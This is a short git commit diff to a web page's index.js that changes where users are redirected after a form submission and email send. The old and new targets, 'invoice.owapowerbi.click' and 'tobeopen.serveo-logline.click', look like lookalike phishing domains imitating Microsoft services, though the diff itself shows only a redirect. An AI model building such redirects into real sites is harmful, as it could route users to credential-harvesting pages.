3837bd7649a1c3ab59ecf599bc89b05904a4777f
husknet <127146284+husknet@users.noreply.github.com>
2024-10-17 11:32:39 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://invoice.owapowerbi.click';
+        window.location.href = 'https://tobeopen.serveo-logline.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
